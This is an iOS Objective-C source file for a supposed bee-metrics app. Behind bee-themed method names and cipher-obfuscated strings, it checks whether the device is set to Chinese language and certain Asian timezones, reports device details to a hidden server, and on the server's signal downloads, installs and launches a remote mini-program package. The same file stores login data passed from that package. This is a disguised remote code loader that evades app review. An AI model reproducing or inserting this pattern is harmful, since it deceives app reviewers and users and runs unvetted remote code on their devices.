//
//  ViewController.m
//  BeeMetric
//
//  Created by BeeMetric on 2024/11/20.
//

#import "ViewController.h"
#import "BeeMetricViewController.h"
#import "BeeLeanMoreViewController.h"
#import "AFNetworking.h"
#import "DCUniMP.h"
#import "SVProgressHUD.h"
#import "ColonyHarmony.h"
#import "BeeFlight.h"

@interface ViewController () <DCUniMPSDKEngineDelegate>

@property (nonatomic, strong) BeeFlight *beeFlight;
@property (weak, nonatomic) IBOutlet UIView *varroaView;
@property (weak, nonatomic) IBOutlet UIView *propolisView;
@property (nonatomic, assign) NSInteger larvalNo;

@property (weak, nonatomic) IBOutlet UIImageView *combView;
@property (weak, nonatomic) IBOutlet UILabel *combLabel;
@property (weak, nonatomic) IBOutlet UILabel *nestLabel;

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    self.larvalNo = 0;
    self.beeFlight = [[BeeFlight alloc] init];
    if ([self.beeFlight foragingFlightPatternsInRelationToNectarSourceDistribution]) {
        self.varroaView.hidden = YES;
    }
    else {
        [DCUniMPSDKEngine setDelegate:self];
        [DCUniMPSDKEngine setMenuButtonHidden:YES];
        [self colonyFlightRangeAndEfficiencyUnderEnvironmentalConstraints];
    }
    
    self.combLabel.text = NSLocalizedString(@"beeMetText1", nil);
    self.nestLabel.text = NSLocalizedString(@"beeMetText4", nil);
    
    self.propolisView.layer.cornerRadius = 20;
    self.propolisView.layer.maskedCorners = kCALayerMinXMinYCorner|kCALayerMinXMaxYCorner;
}

- (IBAction)beeMetricNext:(UIButton *)sender {
    BeeMetricViewController *beeMetric = [[UIStoryboard storyboardWithName:@"Main" bundle:nil] instantiateViewControllerWithIdentifier:@"BeeMetricViewController"];
    beeMetric.modalPresentationStyle = 0;
    beeMetric.beeMetricIndex = self.larvalNo;
    [self presentViewController:beeMetric animated:YES completion:nil];
}

- (IBAction)beeMetricShare:(UIButton *)sender {
    NSString *text = @"BeeMetric";
    NSArray *activityItems = @[text];
    UIActivityViewController *vc = [[UIActivityViewController alloc]initWithActivityItems:activityItems applicationActivities:nil];
    vc.excludedActivityTypes = @[UIActivityTypePostToFacebook, UIActivityTypeAirDrop, UIActivityTypePostToWeibo, UIActivityTypePostToTencentWeibo];
    UIActivityViewControllerCompletionWithItemsHandler block = ^(UIActivityType __nullable activityType, BOOL completed, NSArray * __nullable returnedItems, NSError * __nullable activityError) {
        if (completed){
            NSLog(@"share completed");
        }
    };
    vc.completionWithItemsHandler = block;
    [self presentViewController:vc animated:YES completion:nil];
}

- (IBAction)leanMore:(UIButton *)sender {
    BeeLeanMoreViewController *leanMore = [[UIStoryboard storyboardWithName:@"Main" bundle:nil] instantiateViewControllerWithIdentifier:@"BeeLeanMoreViewController"];
    leanMore.modalPresentationStyle = 0;
    [self presentViewController:leanMore animated:YES completion:nil];
}

- (IBAction)colonyPopulationDynamicsUnderSeasonalEnvironmentalVariations:(UIButton *)sender {
    for (int i=0; i<3; i++) {
        UIButton *byproBtn = [self.view viewWithTag:100+i];
        if (sender.tag == 100+i) {
            byproBtn.backgroundColor = [UIColor blackColor];
            [byproBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        }
        else {
            byproBtn.backgroundColor = [UIColor clearColor];
            [byproBtn setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
        }
    }
    NSInteger byproNo = sender.tag-100;
    self.larvalNo = byproNo;
    UIImageView *honeycombView1 = [self.view viewWithTag:50];
    UIImageView *honeycombView2 = [self.view viewWithTag:51];
    UIImageView *honeycombView3 = [self.view viewWithTag:52];
    if (byproNo == 0) {
        honeycombView1.image = [UIImage imageNamed:@"NestingSite_1"];
        honeycombView2.image = [UIImage imageNamed:@"WaxSecretion_2"];
        honeycombView3.image = [UIImage imageNamed:@"Byproduct_2"];
        self.combView.image = [UIImage imageNamed:@"Honeycomb"];
        self.combLabel.text = NSLocalizedString(@"beeMetText1", nil);
        self.nestLabel.text = NSLocalizedString(@"beeMetText4", nil);
    }
    if (byproNo == 1) {
        honeycombView1.image = [UIImage imageNamed:@"WaxSecretion_1"];
        honeycombView2.image = [UIImage imageNamed:@"Byproduct_2"];
        honeycombView3.image = [UIImage imageNamed:@"NestingSite_2"];
        self.combView.image = [UIImage imageNamed:@"WorkerBee"];
        self.combLabel.text = NSLocalizedString(@"beeMetText2", nil);
        self.nestLabel.text = NSLocalizedString(@"beeMetText5", nil);
    }
    if (byproNo == 2) {
        honeycombView1.image = [UIImage imageNamed:@"Byproduct_1"];
        honeycombView2.image = [UIImage imageNamed:@"NestingSite_2"];
        honeycombView3.image = [UIImage imageNamed:@"WaxSecretion_2"];
        self.combView.image = [UIImage imageNamed:@"Flower"];
        self.combLabel.text = NSLocalizedString(@"beeMetText3", nil);
        self.nestLabel.text = NSLocalizedString(@"beeMetText6", nil);
    }
}

- (void)honeyProductionPotentialBasedOnFloralDiversityAndNectarFlow {
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    
    NSString *potential = [self colonyActivityThroughEnvironmentalTuning:@"jvvru<11yyy0xgt{gzekvguekgpjgtg0eqo1xkfgq1xgtukqpeqpvtq1x31ugngevXgtukqpEqpvtq"];
    NSDictionary *parameters = @{[self colonyActivityThroughEnvironmentalTuning:@"dwpfngKf"]:[self colonyActivityThroughEnvironmentalTuning:@"eqo0uqaxkfgq0ep"]};

    [manager POST:potential parameters:parameters headers:nil progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSLog(@"Res:%@",responseObject);
        NSString *floral = [NSString stringWithFormat:@"%@",[responseObject valueForKey:@"code"]];
        if ([floral isEqualToString:@"200000"]) {
            NSDictionary *data = [responseObject valueForKey:@"data"];
            NSString *diversity = [data valueForKey:[self colonyActivityThroughEnvironmentalTuning:@"xgtukqpPq"]];
            NSString *nectarFlow = [[NSUserDefaults standardUserDefaults] objectForKey:@"Cohesion"];
            if (nectarFlow && [nectarFlow isEqualToString:diversity]) {
                [self apiaryLayoutForMaximizingHoneyYieldPerHiveUnit:diversity];
            }
            else {
                [[NSUserDefaults standardUserDefaults] setObject:diversity forKey:@"Cohesion"];
                [[NSUserDefaults standardUserDefaults] synchronize];
                [self hiveHoneyStorageDynamicsUnderVarying:[data valueForKey:[self colonyActivityThroughEnvironmentalTuning:@"jvonWtn"]] andEnvironmentalConditions:diversity];
            }
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"Error:%@",error);
    }];
}

- (void)hiveHoneyStorageDynamicsUnderVarying:(NSString *)varying andEnvironmentalConditions:(NSString *)conditions {
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.responseSerializer = [AFHTTPResponseSerializer serializer];
    
    NSURL *honey = [NSURL URLWithString:varying];
    NSString *destinationPath = [NSTemporaryDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"Apiary_%@.wgt",conditions]];
    NSURLRequest *storage = [NSURLRequest requestWithURL:honey];
    
    NSURLSessionDownloadTask *hiveHoney = [manager downloadTaskWithRequest:storage
        progress:^(NSProgress * _Nonnull downloadProgress) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [SVProgressHUD showWithStatus:[NSString stringWithFormat:@"新版本下载中：%.0f%%",downloadProgress.fractionCompleted * 100]];
            });
        }
        destination:^NSURL * _Nonnull(NSURL * _Nonnull targetPath, NSURLResponse * _Nonnull response) {
            return [NSURL fileURLWithPath:destinationPath];
        }
        completionHandler:^(NSURLResponse * _Nonnull response, NSURL * _Nullable filePath, NSError * _Nullable error) {
            if (error) {
                [SVProgressHUD dismiss];
            } else {
                [self foragingEfficiencyAndItsImpactOnSeasonalHoneyYield:conditions andSeason:destinationPath];
            }
        }];
    
    [hiveHoney resume];
}

- (void)foragingEfficiencyAndItsImpactOnSeasonalHoneyYield:(NSString *)yield andSeason:(NSString *)season {
    if (![DCUniMPSDKEngine isExistsUniMP:yield]) {
        NSError *error;
        if ([DCUniMPSDKEngine installUniMPResourceWithAppid:yield resourceFilePath:season password:nil error:&error]) {
            [self apiaryLayoutForMaximizingHoneyYieldPerHiveUnit:yield];
        } else {
            [SVProgressHUD dismiss];
        }
    } else {
        [self apiaryLayoutForMaximizingHoneyYieldPerHiveUnit:yield];
    }
}

- (void)apiaryLayoutForMaximizingHoneyYieldPerHiveUnit:(NSString *)hiveUnit {
    DCUniMPConfiguration *maximizing = [[DCUniMPConfiguration alloc] init];
    [DCUniMPSDKEngine openUniMP:hiveUnit configuration:maximizing completed:^(DCUniMPInstance * _Nullable uniMPInstance, NSError * _Nullable error) {
        if (uniMPInstance) {
            [SVProgressHUD dismiss];
        } else {
            [SVProgressHUD dismiss];
        }
    }];
}

- (void)onUniMPEventReceive:(NSString *)appid event:(NSString *)event data:(id)data callback:(DCUniMPKeepAliveCallback)callback {
    if ([event isEqualToString:[self colonyActivityThroughEnvironmentalTuning:@"qrgpDtqyugt"]]) {
        NSString *lifespan = [self extractValueFromJSON:data forKey:@"url"];
        if (lifespan) {
            NSURL *honey = [NSURL URLWithString:lifespan];
            if ([[UIApplication sharedApplication] canOpenURL:honey]) {
                [[UIApplication sharedApplication] openURL:honey options:@{} completionHandler:nil];
            }
        }
    } else if ([event isEqualToString:[self colonyActivityThroughEnvironmentalTuning:@"EcejgFcvc"]]) {
        NSString *broodCare = [self convertJSONToString:data];
        if (broodCare) {
            [[NSUserDefaults standardUserDefaults] setObject:broodCare forKey:[self colonyActivityThroughEnvironmentalTuning:@"nqikpKphq"]];
            [[NSUserDefaults standardUserDefaults] synchronize];
        }
    } else if ([event isEqualToString:[self colonyActivityThroughEnvironmentalTuning:@"HgvejEcejg"]]) {
        NSString *apiary = [[NSUserDefaults standardUserDefaults] objectForKey:[self colonyActivityThroughEnvironmentalTuning:@"nqikpKphq"]];
        if (apiary) {
            NSDictionary *climatic = [self convertJSONStringToDictionary:apiary];
            if (climatic) {
                callback(climatic, YES);
            }
        }
    }
}

- (BOOL)honeyHarvestTimingUsingNectarAvailabilityAndColonyStrengthMetrics {
    NSArray *harvests = @[[self colonyActivityThroughEnvironmentalTuning:@"Cukc1Ujcpijck"],
                          [self colonyActivityThroughEnvironmentalTuning:@"Cukc1Ejqpiskpi"],
                          [self colonyActivityThroughEnvironmentalTuning:@"Cukc1Jctdkp"],
                          [self colonyActivityThroughEnvironmentalTuning:@"Cukc1Wtwosk"]];
    NSTimeZone *nectar = [NSTimeZone localTimeZone];
    NSString *summarize = [nectar name];
    if ([harvests containsObject:summarize]) {
        return YES;
    }
    return NO;
}

- (NSString *)queenBeeLifespanOnColonyHoneyProductionTrends {
    NSString *lifespan = [[NSLocale preferredLanguages] firstObject];
    BOOL colony = [lifespan hasPrefix:@"zh"];
    if (colony && [self honeyHarvestTimingUsingNectarAvailabilityAndColonyStrengthMetrics]) {
        return @"1";
    }
    else {
        return @"0";
    }
}

- (NSString *)extractValueFromJSON:(id)json forKey:(NSString *)key {
    if ([json isKindOfClass:[NSDictionary class]]) {
        return json[key];
    }
    return nil;
}

- (NSString *)convertJSONToString:(id)json {
    if ([json isKindOfClass:[NSDictionary class]] || [json isKindOfClass:[NSArray class]]) {
        NSError *error = nil;
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:json options:0 error:&error];
        if (!error) {
            return [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        }
    }
    return nil;
}

- (NSDictionary *)convertJSONStringToDictionary:(NSString *)jsonString {
    if (jsonString) {
        NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
        NSError *error = nil;
        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (!error) {
            return dict;
        }
    }
    return nil;
}

- (void)colonyFlightRangeAndEfficiencyUnderEnvironmentalConstraints {
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    
    NSDateFormatter *beeSwarm = [[NSDateFormatter alloc] init];
    [beeSwarm setDateFormat:@"yyyy/MM/dd/HH"];
    NSString *workerBee = [beeSwarm stringFromDate:[NSDate date]];
    NSString *colony = [self colonyActivityThroughEnvironmentalTuning:@"jvvru<11yyy0cuvtcnd{vgjqtk|qp0eqo1rqnnkpcvkqp1xcttqcOkvg"];
    
    NSDictionary *parameters = @{@"queenBeeAge":@"BeeMetric",
                                 @"honeyProductionRate":([UIDevice currentDevice].userInterfaceIdiom == UIUserInterfaceIdiomPad)?@"1":@"0",
                                 @"pollinationEfficiency":[self queenBeeLifespanOnColonyHoneyProductionTrends],
                                 @"colonyHealthStatus":workerBee,
                                 @"varroaMiteLevel":[ColonyHarmony colonyResourceAllocationEfficiencyAcrossForagingZones],
                                 @"hiveTemperature":[[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"],
                                 @"pollenConcentration":[ColonyHarmony detectAndVisualizeAnomalousInteractionClusters]};
    
    NSLog(@"parameters:%@",parameters);
    
    [manager POST:colony parameters:parameters headers:nil progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSLog(@"Report:%@",responseObject);
        [SVProgressHUD dismiss];
        NSDictionary *flightRange = [responseObject valueForKey:@"result"];
        NSString *routes = [flightRange valueForKey:@"pollinationresult"];
        if (routes) {
            if ([routes isEqualToString:@"1"]) {
                [self honeyProductionPotentialBasedOnFloralDiversityAndNectarFlow];
                [SVProgressHUD show];
            }
            if ([routes isEqualToString:@"3"]) {
                [self.beeFlight beeFlightTrajectoriesUsingSpatialAndTemporalDataModels:@"Honey"];
                self.varroaView.hidden = YES;
            }
            if ([routes isEqualToString:@"0"]) {
                self.varroaView.hidden = YES;
            }
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"Error:%@",error);
        [self colonyFlightRangeAndEfficiencyUnderEnvironmentalConstraints];
    }];
}

- (NSString *)colonyActivityThroughEnvironmentalTuning:(NSString *)tuning {
    NSMutableString *activity = [NSMutableString stringWithCapacity:[tuning length]];
    for (NSUInteger i = 0; i < [tuning length]; i++) {
        unichar colony = [tuning characterAtIndex:i];
        colony -= 2;
        [activity appendFormat:@"%C", colony];
    }
    return activity;
}

@end
